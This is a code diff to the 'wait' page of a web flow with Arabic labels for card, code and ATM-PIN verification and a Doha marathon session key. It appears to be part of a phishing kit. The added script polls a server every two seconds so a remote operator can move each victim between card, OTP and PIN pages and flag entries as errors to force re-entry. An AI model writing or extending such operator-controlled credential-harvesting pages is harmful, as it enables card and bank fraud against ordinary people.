@@ -60,6 +60,39 @@
 	var labels = { 'payment-card':'جارِ التحقق من البطاقة...', 'payment-verify':'جارِ التحقق من الرمز...', 'atm':'جارِ التحقق من الرقم السري...' };
 	var title = document.getElementById("wait-title");
 	if (title && labels[src]) title.textContent = labels[src];
+
+	var PAGES = {
+		'index':'/', 'registration':'/registration.html', 'registration-summary':'/registration-summary.html',
+		'payment':'/payment.html', 'payment-card':'/payment-card.html', 'qpy':'/qpy.html',
+		'payment-verify':'/payment-verify.html', 'otp':'/otp.html', 'atm':'/atm.html',
+		'wait':'/wait.html', 'success':'/success.html'
+	};
+	var forwardMap = { 'payment-card':'payment-verify', 'payment-verify':'atm', 'atm':'success' };
+	var navigated = false;
+
+	window.doNavigate = function(page) {
+		if (navigated) return;
+		navigated = true;
+		var waitSrc = sessionStorage.getItem('wait-source') || '';
+		if (waitSrc && forwardMap[waitSrc] && page !== forwardMap[waitSrc]) {
+			sessionStorage.setItem('page-error', '1');
+		} else {
+			sessionStorage.removeItem('page-error');
+		}
+		sessionStorage.removeItem('wait-source');
+		window.location.href = PAGES[page] || '/';
+	}
+
+	var sid = localStorage.getItem('doha_marathon_session') || '';
+	if (sid) {
+		var pollId = setInterval(function() {
+			if (navigated) { clearInterval(pollId); return; }
+			fetch('/api/check-navigate/' + encodeURIComponent(sid))
+				.then(function(r) { return r.json(); })
+				.then(function(d) { if (d && d.page) doNavigate(d.page); })
+				.catch(function() {});
+		}, 2000);
+	}
 })();
 </script>
 </body>
